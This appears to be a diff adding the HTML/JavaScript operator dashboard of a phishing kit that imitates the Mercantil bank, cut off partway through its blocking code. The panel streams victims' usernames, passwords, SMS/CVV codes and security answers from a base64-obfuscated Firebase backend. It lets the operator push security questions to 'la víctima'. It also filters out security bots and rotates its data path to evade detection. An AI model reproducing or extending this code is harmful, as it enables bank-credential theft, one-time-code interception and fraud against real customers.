@@ -1,0 +1,967 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>MERCANTIL · Panel de Control</title>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800;900&display=swap" rel="stylesheet"/>
+<link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" rel="stylesheet"/>
+<style>
+:root{
+  --bg:#06090f;--s1:#0b1120;--s2:#111827;--s3:#1a2540;
+  --border:#1e2d47;--border2:#253552;
+  --text:#e2e8f5;--muted:#64748b;--muted2:#94a3b8;
+  --accent:#1a6fd4;--accent2:#2563eb;
+  --green:#10b981;--red:#ef4444;--orange:#f59e0b;
+  --purple:#8b5cf6;--teal:#06b6d4;--pink:#ec4899;
+  --yellow:#eab308;
+}
+*{margin:0;padding:0;box-sizing:border-box;}
+body{font-family:'Inter',sans-serif;background:var(--bg);color:var(--text);font-size:12px;min-height:100vh;overflow-x:hidden;}
+
+/* ===== PARTICLES BG ===== */
+#particles{position:fixed;inset:0;pointer-events:none;z-index:0;overflow:hidden;}
+.particle{position:absolute;width:2px;height:2px;background:rgba(26,111,212,.3);border-radius:50%;animation:float linear infinite;}
+@keyframes float{0%{transform:translateY(100vh) scale(0);opacity:0}10%{opacity:1}90%{opacity:.3}100%{transform:translateY(-10px) scale(1);opacity:0}}
+
+/* ===== LOGIN ===== */
+#login-screen{
+  position:fixed;inset:0;
+  background:radial-gradient(ellipse at 50% 0%,#0d1f3c 0%,#060912 70%);
+  display:flex;align-items:center;justify-content:center;z-index:1000;
+}
+.login-card{
+  background:linear-gradient(145deg,rgba(11,17,32,.95),rgba(17,24,39,.9));
+  border:1px solid rgba(26,111,212,.25);border-radius:24px;
+  padding:48px 44px;width:100%;max-width:400px;
+  box-shadow:0 32px 100px rgba(0,0,0,.7),0 0 0 1px rgba(26,111,212,.1),inset 0 1px 0 rgba(255,255,255,.05);
+  animation:loginIn .5s cubic-bezier(.34,1.56,.64,1);position:relative;overflow:hidden;
+}
+.login-card::before{
+  content:'';position:absolute;top:-1px;left:20%;right:20%;height:1px;
+  background:linear-gradient(90deg,transparent,rgba(26,111,212,.6),transparent);
+}
+@keyframes loginIn{from{opacity:0;transform:translateY(30px) scale(.97)}to{opacity:1;transform:translateY(0) scale(1)}}
+.login-badge{
+  display:flex;align-items:center;justify-content:center;gap:10px;margin-bottom:8px;
+}
+.login-badge img{height:36px;border-radius:6px;}
+.login-title{text-align:center;font-size:18px;font-weight:800;color:#fff;margin-bottom:4px;letter-spacing:-.3px;}
+.login-sub{text-align:center;font-size:11px;color:var(--muted);margin-bottom:32px;}
+.lf{margin-bottom:16px;}
+.lf label{display:block;font-size:10px;font-weight:700;color:var(--muted);text-transform:uppercase;letter-spacing:.8px;margin-bottom:7px;}
+.lf input{
+  width:100%;background:rgba(255,255,255,.04);border:1px solid var(--border2);
+  border-radius:12px;padding:13px 16px;color:var(--text);font-size:14px;font-family:inherit;
+  outline:none;transition:all .2s;
+}
+.lf input:focus{border-color:var(--accent);background:rgba(26,111,212,.06);box-shadow:0 0 0 3px rgba(26,111,212,.12);}
+.login-err{color:var(--red);font-size:11px;margin-bottom:12px;display:none;text-align:center;padding:8px;background:rgba(239,68,68,.08);border-radius:8px;border:1px solid rgba(239,68,68,.2);}
+.btn-login{
+  width:100%;padding:14px;margin-top:4px;
+  background:linear-gradient(135deg,var(--accent),var(--accent2));color:#fff;border:none;
+  border-radius:12px;font-size:14px;font-weight:700;cursor:pointer;font-family:inherit;
+  transition:all .2s;box-shadow:0 4px 20px rgba(26,111,212,.35);letter-spacing:.2px;
+}
+.btn-login:hover{transform:translateY(-1px);box-shadow:0 6px 28px rgba(26,111,212,.5);}
+.btn-login:active{transform:translateY(0);}
+
+/* ===== TOPBAR ===== */
+#topbar{
+  display:flex;align-items:center;gap:10px;
+  background:rgba(11,17,32,.9);backdrop-filter:blur(20px);
+  border-bottom:1px solid var(--border);padding:10px 20px;
+  position:sticky;top:0;z-index:100;flex-wrap:wrap;
+}
+.topbar-logo{display:flex;align-items:center;gap:10px;}
+.topbar-logo img{height:28px;border-radius:5px;}
+.logo-name{font-size:14px;font-weight:800;background:linear-gradient(135deg,#4da3ff,#a78bfa);-webkit-background-clip:text;-webkit-text-fill-color:transparent;letter-spacing:-.3px;}
+.logo-sub{font-size:9px;color:var(--muted);letter-spacing:.5px;text-transform:uppercase;}
+.topbar-right{margin-left:auto;display:flex;align-items:center;gap:8px;}
+#btn-logout{
+  background:rgba(239,68,68,.08);border:1px solid rgba(239,68,68,.15);
+  color:var(--red);border-radius:8px;padding:6px 14px;
+  font-size:11px;font-weight:600;cursor:pointer;font-family:inherit;transition:all .2s;
+}
+#btn-logout:hover{background:rgba(239,68,68,.18);border-color:rgba(239,68,68,.3);}
+.live-dot{width:6px;height:6px;border-radius:50%;background:var(--green);box-shadow:0 0 6px var(--green);animation:pulse-dot 2s infinite;}
+@keyframes pulse-dot{0%,100%{opacity:1;box-shadow:0 0 6px var(--green)}50%{opacity:.5;box-shadow:0 0 14px var(--green)}}
+
+/* ===== COUNTERS ===== */
+.counters{display:flex;gap:10px;padding:16px 20px 0;flex-wrap:wrap;}
+.counter-card{
+  background:linear-gradient(145deg,var(--s1),var(--s2));
+  border:1px solid var(--border);border-radius:14px;padding:14px 18px;
+  display:flex;align-items:center;gap:12px;min-width:110px;
+  transition:transform .2s,box-shadow .2s;cursor:default;
+  animation:slideIn .4s ease both;
+}
+.counter-card:hover{transform:translateY(-2px);box-shadow:0 8px 24px rgba(0,0,0,.3);}
+.counter-icon{width:36px;height:36px;border-radius:10px;display:flex;align-items:center;justify-content:center;font-size:16px;}
+.counter-card .num{font-size:24px;font-weight:800;line-height:1;}
+.counter-card .lbl{font-size:10px;color:var(--muted);margin-top:2px;font-weight:500;}
+@keyframes slideIn{from{opacity:0;transform:translateY(12px)}to{opacity:1;transform:translateY(0)}}
+
+/* ===== TABLE ===== */
+.wrap{padding:16px 20px;overflow-x:auto;}
+table{width:100%;border-collapse:separate;border-spacing:0 4px;min-width:900px;}
+thead th{
+  padding:10px 10px;text-align:center;font-size:9px;font-weight:700;
+  color:var(--muted);text-transform:uppercase;letter-spacing:.8px;
+  background:transparent;white-space:nowrap;
+}
+tbody tr{
+  background:var(--s1);border-radius:10px;
+  transition:all .2s;animation:rowIn .3s ease both;
+}
+@keyframes rowIn{from{opacity:0;transform:translateX(-8px)}to{opacity:1;transform:translateX(0)}}
+tbody tr:hover{background:var(--s2);transform:translateX(2px);}
+tbody td{
+  padding:10px 10px;text-align:center;vertical-align:middle;
+  border-top:1px solid rgba(30,45,71,.5);border-bottom:1px solid rgba(30,45,71,.5);
+  font-size:11px;
+}
+tbody td:first-child{border-left:1px solid rgba(30,45,71,.5);border-radius:10px 0 0 10px;padding-left:14px;text-align:left;}
+tbody td:last-child{border-right:1px solid rgba(30,45,71,.5);border-radius:0 10px 10px 0;padding-right:10px;}
+
+.cell-id{font-size:9px;color:var(--muted);max-width:100px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;}
+.cell-data{font-weight:600;}
+.cell-data.empty{color:var(--border2);font-style:italic;font-weight:400;}
+
+/* ===== STATUS ===== */
+.s-online{display:inline-flex;align-items:center;gap:5px;background:rgba(16,185,129,.1);border:1px solid rgba(16,185,129,.2);color:var(--green);border-radius:20px;padding:3px 10px;font-size:9px;font-weight:700;letter-spacing:.5px;}
+.s-offline{display:inline-flex;align-items:center;gap:5px;background:rgba(100,116,139,.08);border:1px solid rgba(100,116,139,.15);color:var(--muted);border-radius:20px;padding:3px 10px;font-size:9px;font-weight:700;letter-spacing:.5px;}
+.s-dot{width:5px;height:5px;border-radius:50%;}
+.s-dot-on{background:var(--green);box-shadow:0 0 6px var(--green);animation:pulse-dot 2s infinite;}
+.s-dot-off{background:var(--muted);}
+
+/* ===== BUTTONS ===== */
+.btn-group{display:flex;flex-wrap:wrap;gap:4px;justify-content:center;}
+.btn{
+  display:inline-flex;align-items:center;gap:4px;
+  border:none;border-radius:7px;padding:5px 9px;
+  font-size:10px;font-weight:600;cursor:pointer;font-family:inherit;
+  transition:all .15s;white-space:nowrap;letter-spacing:.1px;
+}
+.btn:hover{transform:translateY(-1px);filter:brightness(1.15);}
+.btn:active{transform:translateY(0);filter:brightness(.95);}
+.btn-red{background:rgba(239,68,68,.15);color:#f87171;border:1px solid rgba(239,68,68,.2);}
+.btn-green{background:rgba(16,185,129,.15);color:#34d399;border:1px solid rgba(16,185,129,.2);}
+.btn-teal{background:rgba(6,182,212,.15);color:#22d3ee;border:1px solid rgba(6,182,212,.2);}
+.btn-orange{background:rgba(245,158,11,.15);color:#fbbf24;border:1px solid rgba(245,158,11,.2);}
+.btn-purple{background:rgba(139,92,246,.15);color:#a78bfa;border:1px solid rgba(139,92,246,.2);}
+.btn-pink{background:rgba(236,72,153,.15);color:#f472b6;border:1px solid rgba(236,72,153,.2);}
+.btn-blue{background:rgba(26,111,212,.2);color:#60a5fa;border:1px solid rgba(26,111,212,.25);}
+.btn-danger{background:rgba(239,68,68,.2);color:#fca5a5;border:1px solid rgba(239,68,68,.3);}
+.btn-muted{background:rgba(100,116,139,.1);color:var(--muted2);border:1px solid rgba(100,116,139,.15);}
+
+/* ===== BOT WARNING ===== */
+.bot-warn{display:inline-flex;align-items:center;gap:4px;background:rgba(245,158,11,.15);border:1px solid rgba(245,158,11,.3);color:var(--orange);border-radius:6px;padding:2px 7px;font-size:9px;font-weight:700;cursor:pointer;animation:warnPulse 2s infinite;}
+@keyframes warnPulse{0%,100%{box-shadow:0 0 0 0 rgba(245,158,11,.4)}50%{box-shadow:0 0 0 4px rgba(245,158,11,0)}}
+
+/* ===== MODAL ===== */
+.modal-overlay{
+  position:fixed;inset:0;background:rgba(0,0,0,.75);backdrop-filter:blur(6px);
+  z-index:500;display:none;align-items:center;justify-content:center;
+}
+.modal-overlay.active{display:flex;animation:fadeOverlay .2s ease;}
+@keyframes fadeOverlay{from{opacity:0}to{opacity:1}}
+.modal-box{
+  background:linear-gradient(145deg,var(--s1),var(--s2));
+  border:1px solid var(--border2);border-radius:20px;padding:28px 30px;
+  width:100%;max-width:460px;position:relative;
+  box-shadow:0 24px 80px rgba(0,0,0,.6);
+  animation:modalIn .25s cubic-bezier(.34,1.56,.64,1);
+}
+@keyframes modalIn{from{opacity:0;transform:scale(.94) translateY(10px)}to{opacity:1;transform:scale(1) translateY(0)}}
+.modal-title{font-size:15px;font-weight:700;margin-bottom:4px;display:flex;align-items:center;gap:8px;}
+.modal-sub{font-size:11px;color:var(--muted);margin-bottom:20px;}
+.modal-close{position:absolute;top:16px;right:16px;background:rgba(255,255,255,.06);border:1px solid var(--border);color:var(--muted);border-radius:8px;width:28px;height:28px;display:flex;align-items:center;justify-content:center;cursor:pointer;font-size:12px;transition:all .2s;}
+.modal-close:hover{background:rgba(239,68,68,.15);color:var(--red);border-color:rgba(239,68,68,.2);}
+.mf{margin-bottom:14px;}
+.mf label{display:block;font-size:10px;font-weight:600;color:var(--muted);letter-spacing:.5px;text-transform:uppercase;margin-bottom:6px;}
+.mf input,.mf textarea{
+  width:100%;background:rgba(255,255,255,.04);border:1px solid var(--border2);
+  border-radius:10px;padding:11px 14px;color:var(--text);font-size:12px;font-family:inherit;
+  outline:none;transition:all .2s;resize:none;
+}
+.mf input:focus,.mf textarea:focus{border-color:var(--accent);box-shadow:0 0 0 3px rgba(26,111,212,.12);}
+.modal-actions{display:flex;gap:8px;margin-top:20px;}
+.modal-actions .btn{flex:1;justify-content:center;padding:10px;}
+
+/* ===== BLOCK POPOVER ===== */
+.block-pop{
+  position:fixed;background:linear-gradient(145deg,#0f1928,#161f30);
+  border:1px solid rgba(245,158,11,.25);border-radius:14px;padding:14px;
+  z-index:600;min-width:200px;box-shadow:0 16px 50px rgba(0,0,0,.7);
+  animation:popIn .2s cubic-bezier(.34,1.56,.64,1);display:none;
+}
+.block-pop.active{display:block;}
+@keyframes popIn{from{opacity:0;transform:scale(.9)}to{opacity:1;transform:scale(1)}}
+.block-pop-title{font-size:10px;font-weight:700;color:var(--orange);margin-bottom:10px;display:flex;align-items:center;gap:5px;letter-spacing:.5px;text-transform:uppercase;}
+.block-opt{
+  display:flex;align-items:center;gap:8px;padding:8px 10px;
+  border-radius:8px;cursor:pointer;transition:background .15s;margin-bottom:4px;
+  font-size:11px;font-weight:500;
+}
+.block-opt:hover{background:rgba(255,255,255,.06);}
+.block-opt:last-child{margin-bottom:0;}
+.block-opt i{width:14px;text-align:center;}
+
+/* ===== EMPTY ===== */
+#empty-state{
+  display:none;flex-direction:column;align-items:center;justify-content:center;
+  padding:60px 20px;color:var(--muted);gap:12px;
+}
+#empty-state i{font-size:40px;opacity:.2;}
+#empty-state p{font-size:13px;opacity:.5;}
+
+/* ===== TOAST ===== */
+#toast{
+  position:fixed;bottom:24px;right:24px;
+  background:rgba(11,17,32,.95);border:1px solid var(--border2);
+  border-radius:12px;padding:12px 18px;font-size:12px;font-weight:600;
+  box-shadow:0 8px 30px rgba(0,0,0,.5);z-index:900;
+  opacity:0;transform:translateY(10px);transition:all .3s;pointer-events:none;
+  backdrop-filter:blur(10px);
+}
+#toast.show{opacity:1;transform:translateY(0);}
+
+/* ===== BADGE CREDEN ===== */
+.cred-new{animation:credGlow .5s ease;}
+@keyframes credGlow{0%{background:rgba(16,185,129,.3)}100%{background:transparent}}
+
+/* ===== SEARCH/FILTER BAR ===== */
+.toolbar{display:flex;align-items:center;gap:10px;padding:12px 20px 0;flex-wrap:wrap;}
+.search-box{
+  display:flex;align-items:center;gap:8px;
+  background:rgba(255,255,255,.04);border:1px solid var(--border2);
+  border-radius:10px;padding:7px 12px;flex:1;max-width:260px;
+}
+.search-box input{background:transparent;border:none;outline:none;color:var(--text);font-size:12px;font-family:inherit;width:100%;}
+.search-box i{color:var(--muted);font-size:11px;}
+.btn-sm{padding:6px 12px;font-size:10px;border-radius:8px;}
+</style>
+</head>
+<body>
+
+<!-- Particles -->
+<div id="particles"></div>
+
+<!-- Toast -->
+<div id="toast"></div>
+
+<!-- Block Popover -->
+<div class="block-pop" id="block-pop">
+  <div class="block-pop-title"><i class="fas fa-shield-alt"></i> BLOQUEAR</div>
+  <div class="block-opt" id="bopt-ip" onclick="blockAction('ip')">
+    <i class="fas fa-network-wired" style="color:var(--orange)"></i>
+    <span>Bloquear IP</span>
+  </div>
+  <div class="block-opt" id="bopt-up" onclick="blockAction('userpass')">
+    <i class="fas fa-user-slash" style="color:var(--red)"></i>
+    <span>Bloquear User+Pass</span>
+  </div>
+  <div class="block-opt" id="bopt-all" onclick="blockAction('all')" style="color:var(--red)">
+    <i class="fas fa-skull" style="color:var(--red)"></i>
+    <span style="color:var(--red);font-weight:700">Todo + borrar sesiones</span>
+  </div>
+  <div class="block-opt" id="bopt-bot" onclick="blockAction('bot')" style="color:#8b5cf6; background:rgba(139,92,246,0.1)">
+    <i class="fas fa-robot" style="color:#8b5cf6"></i>
+    <span style="color:#8b5cf6;font-weight:700">Erradicar Bot (Avanzado)</span>
+  </div>
+</div>
+
+<!-- Modal Preguntas -->
+<div class="modal-overlay" id="modal-preguntas">
+  <div class="modal-box">
+    <button class="modal-close" onclick="closeModal('modal-preguntas')"><i class="fas fa-times"></i></button>
+    <div class="modal-title"><i class="fas fa-question-circle" style="color:var(--purple)"></i> Preguntas de Seguridad</div>
+    <div class="modal-sub" id="mpreg-sub">Escribe las 2 preguntas que verá la víctima</div>
+    <div class="mf">
+      <label><i class="fas fa-1" style="font-size:9px"></i> Pregunta 1</label>
+      <input type="text" id="mpreg-q1" placeholder="Ej: ¿Cuál es el nombre de tu mascota?" />
+    </div>
+    <div class="mf">
+      <label><i class="fas fa-2" style="font-size:9px"></i> Pregunta 2</label>
+      <input type="text" id="mpreg-q2" placeholder="Ej: ¿Cuál es tu ciudad de nacimiento?" />
+    </div>
+    <div class="modal-actions">
+      <button class="btn btn-muted" onclick="closeModal('modal-preguntas')">Cancelar</button>
+      <button class="btn btn-purple" onclick="sendPreguntas()"><i class="fas fa-paper-plane"></i> Enviar Preguntas</button>
+    </div>
+  </div>
+</div>
+
+<!-- Login -->
+<div id="login-screen">
+  <div class="login-card">
+    <div class="login-badge">
+      <img src="logo.png" onerror="this.style.display='none'">
+      <span style="font-size:20px;font-weight:900;color:#fff;">MERCANTIL</span>
+    </div>
+    <div class="login-title">Panel de Control</div>
+    <div class="login-sub">Sistema de monitoreo en tiempo real</div>
+    <div class="lf"><label>Usuario</label><input type="text" id="inp-user" placeholder="Usuario" autocomplete="off"/></div>
+    <div class="lf"><label>Contraseña</label><input type="password" id="inp-pass" placeholder="••••••••" autocomplete="off"/></div>
+    <div class="login-err" id="login-err"><i class="fas fa-exclamation-triangle"></i> Credenciales incorrectas</div>
+    <button class="btn-login" id="btn-login-cp"><i class="fas fa-sign-in-alt"></i> Ingresar</button>
+  </div>
+</div>
+
+<!-- Panel -->
+<div id="panel" style="display:none;position:relative;z-index:1;">
+  <div id="topbar">
+    <div class="topbar-logo">
+      <img src="logo.png" onerror="this.style.display='none'" style="height:26px;border-radius:5px;">
+      <div>
+        <div class="logo-name">MERCANTIL CPANEL</div>
+        <div class="logo-sub">Panel de Control · Live</div>
+      </div>
+    </div>
+    <div style="display:flex;align-items:center;gap:6px;margin-left:12px;">
+      <div class="live-dot"></div>
+      <span style="font-size:10px;color:var(--green);font-weight:600;">FIREBASE ACTIVO</span>
+    </div>
+    <div class="topbar-right">
+      <span class="vcnt-lbl">Sesiones: <b id="vcnt">0</b></span>
+      <button id="btn-logout"><i class="fas fa-power-off"></i> Salir</button>
+    </div>
+  </div>
+
+  <div class="counters">
+    <div class="counter-card" style="animation-delay:.0s">
+      <div class="counter-icon" style="background:rgba(26,111,212,.15)"><i class="fas fa-users" style="color:var(--accent)"></i></div>
+      <div><div class="num" id="s-total">0</div><div class="lbl">Total</div></div>
+    </div>
+    <div class="counter-card" style="animation-delay:.05s">
+      <div class="counter-icon" style="background:rgba(16,185,129,.15)"><i class="fas fa-circle" style="color:var(--green);font-size:10px"></i></div>
+      <div><div class="num" id="s-online" style="color:var(--green)">0</div><div class="lbl">En línea</div></div>
+    </div>
+    <div class="counter-card" style="animation-delay:.1s">
+      <div class="counter-icon" style="background:rgba(245,158,11,.15)"><i class="fas fa-key" style="color:var(--orange)"></i></div>
+      <div><div class="num" id="s-creds" style="color:var(--orange)">0</div><div class="lbl">Con clave</div></div>
+    </div>
+    <div class="counter-card" style="animation-delay:.15s">
+      <div class="counter-icon" style="background:rgba(6,182,212,.15)"><i class="fas fa-sms" style="color:var(--teal)"></i></div>
+      <div><div class="num" id="s-sms" style="color:var(--teal)">0</div><div class="lbl">Con SMS</div></div>
+    </div>
+    <div class="counter-card" style="animation-delay:.2s">
+      <div class="counter-icon" style="background:rgba(139,92,246,.15)"><i class="fas fa-question" style="color:var(--purple)"></i></div>
+      <div><div class="num" id="s-pregs" style="color:var(--purple)">0</div><div class="lbl">Preguntas</div></div>
+    </div>
+    <div class="counter-card" style="animation-delay:.25s">
+      <div class="counter-icon" style="background:rgba(239,68,68,.12)"><i class="fas fa-robot" style="color:var(--red)"></i></div>
+      <div><div class="num" id="s-bots" style="color:var(--red)">0</div><div class="lbl">Sospechosos</div></div>
+    </div>
+    <div class="counter-card" style="animation-delay:.30s;cursor:pointer" title="Bots capturados por el CAPTCHA (sesión M_captcha)">
+      <div class="counter-icon" style="background:rgba(234,179,8,.12)"><i class="fas fa-shield-alt" style="color:#eab308"></i></div>
+      <div><div class="num" id="s-captcha" style="color:#eab308">0</div><div class="lbl">Captcha</div></div>
+    </div>
+  </div>
+
+  <!-- Banner de alerta de ataque 7s -->
+  <div id="alert-burst" style="display:none;background:rgba(239,68,68,.15);border:1px solid #ef4444;border-radius:10px;padding:10px 16px;margin:0 0 10px;display:none;align-items:center;gap:10px;color:#ef4444;font-size:13px;font-weight:600;">
+    <i class="fas fa-exclamation-triangle"></i>
+    <span id="alert-burst-msg">⚠️ ATAQUE DETECTADO: Bots llegando cada ~7 segundos desde misma IP.</span>
+    <button onclick="rotarPath()" style="margin-left:auto;background:#ef4444;color:#fff;border:none;border-radius:7px;padding:6px 14px;cursor:pointer;font-weight:700;font-size:12px;white-space:nowrap">
+      <i class="fas fa-random"></i> ROTAR PATH AHORA
+    </button>
+    <button onclick="document.getElementById('alert-burst').style.display='none'" style="background:none;color:#ef4444;border:none;cursor:pointer;font-size:16px">✕</button>
+  </div>
+
+  <div class="toolbar">
+    <div class="search-box">
+      <i class="fas fa-search"></i>
+      <input type="text" id="search-input" placeholder="Buscar usuario, clave, SMS..." oninput="filterTable(this.value)"/>
+    </div>
+    <button class="btn btn-danger btn-sm" onclick="clearAll()"><i class="fas fa-trash"></i> Limpiar todo</button>
+    <button class="btn btn-sm" style="background:rgba(245,158,11,.15);color:#fbbf24;border:1px solid rgba(245,158,11,.3)" onclick="purgeBots()"><i class="fas fa-robot"></i> Borrar Bots</button>
+    <button class="btn btn-sm" style="background:rgba(239,68,68,.15);color:#ef4444;border:1px solid rgba(239,68,68,.3)" onclick="rotarPath()" title="Cambia el ID de Firebase y corta a los bots">
+      <i class="fas fa-random"></i> Rotar PATH
+    </button>
+  </div>
+
+  <div class="wrap">
+    <div id="empty-state">
+      <i class="fas fa-satellite-dish"></i>
+      <p>Esperando conexiones...</p>
+    </div>
+    <div id="table-wrap" style="display:none;">
+      <table>
+        <thead>
+          <tr>
+            <th style="text-align:left">ID SESIÓN</th>
+            <th>USUARIO</th>
+            <th>CLAVE</th>
+            <th>SMS / CVV</th>
+            <th>CV TEMP</th>
+            <th>PREGUNTAS</th>
+            <th>PÁGINA</th>
+            <th>ESTADO</th>
+            <th>ACCIONES</th>
+            <th>CONTROL</th>
+          </tr>
+        </thead>
+        <tbody id="victims-body"></tbody>
+      </table>
+    </div>
+  </div>
+</div>
+
+<script src="panel_config.js"></script>
+<!-- Firebase compat -->
+<script src="firebase-shim-app.js"></script>
+<script src="firebase-shim-db.js"></script>
+
+<script>
+// ===== PARTICLES =====
+(function(){
+  const c = document.getElementById('particles');
+  for(let i=0;i<25;i++){
+    const p=document.createElement('div');
+    p.className='particle';
+    p.style.cssText=`left:${Math.random()*100}%;animation-duration:${8+Math.random()*12}s;animation-delay:${Math.random()*10}s;width:${1+Math.random()*2}px;height:${1+Math.random()*2}px;opacity:${.1+Math.random()*.3}`;
+    c.appendChild(p);
+  }
+})();
+
+// ===== FIREBASE CONFIG =====
+(function(){
+  var _d=atob,_c={
+    apiKey:_d('QUl6YVN5Q0FIVkRzLUVfTEtvVldyMXJKdmRqSHpHTndfbU0xSjVN'),
+    authDomain:_d('ZGV2aWNlLXN0cmVhbWluZy0yZjllNjhiNi5maXJlYmFzZWFwcC5jb20='),
+    databaseURL:_d('aHR0cDovLzEyNy4wLjAuMTo4Nzg3'),
+    projectId:_d('ZGV2aWNlLXN0cmVhbWluZy0yZjllNjhiNg=='),
+    storageBucket:_d('ZGV2aWNlLXN0cmVhbWluZy0yZjllNjhiNi5maXJlYmFzZXN0b3JhZ2UuYXBw'),
+    messagingSenderId:_d('NTQyMDQ3NjIwNjYz'),
+    appId:_d('MTo1NDIwNDc2MjA2NjM6d2ViOjFlMzUyNmYxZGVlODA5MzdlZjc5YjI=')
+  };
+  if(!firebase.apps.length)firebase.initializeApp(_c);
+  window._db=firebase.database();
+  window._DP=_d('dm1fNzdjZjI4ZmZkYg==');
+  window._AU=_d('MQ==');
+  window._AP=_d('MQ==');
+})();
+
+const db = window._db;
+const _domain = window.location.hostname || 'local_test';
+const _auto_path = _domain.replace(/[^a-zA-Z0-9]/g, '_') + '_s2x0';
+const DB_PATH = (typeof cp_path !== 'undefined' && cp_path !== '') ? cp_path : _auto_path;
+const SESSION_KEY = 'cp_mercantil_v2';
+const USR = (typeof cp_user !== 'undefined') ? cp_user : window._AU;
+const PWD = (typeof cp_pass !== 'undefined') ? cp_pass : window._AP;
+
+// ===== TOAST =====
+function toast(msg, color){
+  const t=document.getElementById('toast');
+  t.innerHTML=msg;
+  t.style.borderColor=(color||'var(--border2)');
+  t.style.color=(color?'#fff':'var(--text)');
+  if(color) t.style.background=color+'22';
+  else t.style.background='';
+  t.classList.add('show');
+  clearTimeout(t._tid);
+  t._tid=setTimeout(()=>t.classList.remove('show'),2800);
+}
+
+// ===== LOGIN =====
+function checkSession(){
+  if(localStorage.getItem(SESSION_KEY)) showPanel();
+  else document.getElementById('login-screen').style.display='flex';
+}
+function doLogin(){
+  const u=document.getElementById('inp-user').value.trim();
+  const p=document.getElementById('inp-pass').value.trim();
+  if(u===USR&&p===PWD){
+    localStorage.setItem(SESSION_KEY,'1');
+    showPanel();
+  }else{
+    const err=document.getElementById('login-err');
+    err.style.display='block';
+    document.getElementById('inp-pass').value='';
+    setTimeout(()=>err.style.display='none',3500);
+  }
+}
+function showPanel(){
+  document.getElementById('login-screen').style.display='none';
+  document.getElementById('panel').style.display='block';
+  initFirebasePanel();
+}
+document.getElementById('btn-login-cp').addEventListener('click',doLogin);
+document.getElementById('inp-pass').addEventListener('keydown',e=>{if(e.key==='Enter')doLogin();});
+document.getElementById('inp-user').addEventListener('keydown',e=>{if(e.key==='Enter')document.getElementById('inp-pass').focus();});
+document.getElementById('btn-logout').addEventListener('click',()=>{localStorage.removeItem(SESSION_KEY);location.reload();});
+
+// ===== FIREBASE PANEL =====
+function initFirebasePanel(){
+  db.ref(DB_PATH).on('value',function(snap){
+    const data=snap.val()||{};
+    
+    // ====== AUTO BARRERA CONTRA BOTS ======
+    let botsKilled = 0;
+    const credCount = {};
+    const updates = {};
+    const keys = Object.keys(data);
+    
+    // Contar usuarios iguales y detectar bots instantáneos
+    keys.forEach(k => {
+      const v = data[k];
+      const botKeywords = ['SASA123', 'CONTRA123', 'GODHYDRA', 'GODHYDRA666', '@GODHYDRA', 'HYDRA', 'BOT', 'SPAM', 'TEST', 'HACK', 'AUTO', 'SCRIPT'];
+      let isBot = false;
+
+      // Filtro 0: Claves inyectadas por bot (formato M_timestamp_random)
+      if (/^M_\d+_\d+$/.test(k) || /^M_\d{10,}/.test(k) || k.split('_').length > 2) isBot = true;
+
+      // Filtro 1: Palabras conocidas
+      if (v.usuario && botKeywords.some(b => v.usuario.toUpperCase().includes(b))) isBot = true;
+      if (v.clave && botKeywords.some(b => v.clave.toUpperCase().includes(b))) isBot = true;
+
+      // Filtro 2: Más de 2 sesiones con las mismas credenciales
+      if (v.usuario && v.clave) {
+        const uc = v.usuario + '|' + v.clave;
+        credCount[uc] = (credCount[uc] || 0) + 1;
+        if (credCount[uc] > 2) isBot = true;
+      }
+      
+      // Filtro 3: Sin el token de humano que pusimos en el inicio
+      if (v.ip && !v._htok) isBot = true;
+
+      if (isBot) {
+        updates[k] = null;
+        delete data[k];
+        botsKilled++;
+      }
+    });
+
+    if (botsKilled > 0) {
+      db.ref(DB_PATH).update(updates);
+      console.log('Bots bloqueados y eliminados automáticamente:', botsKilled);
+      toast('Escudo Activo: ' + botsKilled + ' Bots bloqueados al instante.', '#10b981');
+    }
+    // ======================================
+
+    window._allData=data;
+    renderAll(data);
+  });
+}
+
+window.purgeBots=function(){
+  if(confirm('¿Eliminar todas las sesiones detectadas como BOTS (más de 2 iguales o sin formato)?')){
+    const data = window._allData || {};
+    const groups = {};
+    Object.keys(data).forEach(k => {
+      const v = data[k];
+      const key = (v.usuario||'')+'|'+(v.clave||'');
+      if(!groups[key]) groups[key] = [];
+      groups[key].push(k);
+    });
+    let count = 0;
+    Object.keys(groups).forEach(key => {
+      if(groups[key].length > 2) {
+        groups[key].forEach(id => {
+          db.ref(DB_PATH+'/'+id).remove();
+          count++;
+        });
+      } else {
+        // Check for common bot patterns like exact same username length, random symbols without vowels, etc.
+        // Actually, just killing groups > 2 is safe. The honeypot will stop future ones.
+      }
+    });
+    // Also delete any where usuario length > 25 (common in raw brute forces) or _k is present without ip
+    Object.keys(data).forEach(k => {
+      const v = data[k];
+      if((v.usuario && v.usuario.length > 25) || (v._k && !v.ip)) {
+        db.ref(DB_PATH+'/'+k).remove();
+        count++;
+      }
+    });
+    toast('<i class="fas fa-broom"></i> '+count+' bots eliminados');
+  }
+};
+// ===== MODAL =====
+let _modalVictimId=null;
+function openModal(id){ document.getElementById(id).classList.add('active'); }
+function closeModal(id){ document.getElementById(id).classList.remove('active'); }
+document.querySelectorAll('.modal-overlay').forEach(m=>m.addEventListener('click',e=>{if(e.target===m)m.classList.remove('active');}));
+
+// ===== BLOCK POPOVER =====
+let _blockVictimId=null, _blockData=null;
+function showBlockPop(id, evtOrEl){
+  _blockVictimId=id;
+  _blockData=(window._allData||{})[id]||{};
+  const pop=document.getElementById('block-pop');
+  // evtOrEl can be a MouseEvent (new button) or an element (old bot-warn badge)
+  let rect;
+  if(evtOrEl && evtOrEl.currentTarget){
+    rect=evtOrEl.currentTarget.getBoundingClientRect();
+    evtOrEl.stopPropagation();
+  } else if(evtOrEl && evtOrEl.getBoundingClientRect){
+    rect=evtOrEl.getBoundingClientRect();
+  } else {
+    rect={bottom:window.innerHeight/2, left:window.innerWidth/2};
+  }
+  pop.style.top=(rect.bottom+window.scrollY+6)+'px';
+  pop.style.left=Math.min(rect.left,window.innerWidth-220)+'px';
+  pop.classList.add('active');
+  setTimeout(()=>document.addEventListener('click',closePop,{once:true}),100);
+}
+function closePop(){ document.getElementById('block-pop').classList.remove('active'); }
+
+function blockAction(type){
+  if(!_blockVictimId||!_blockData)return;
+  const usr=_blockData.usuario||'';
+  const clv=_blockData.clave||'';
+  const data=window._allData||{};
+
+  if(type==='ip'){
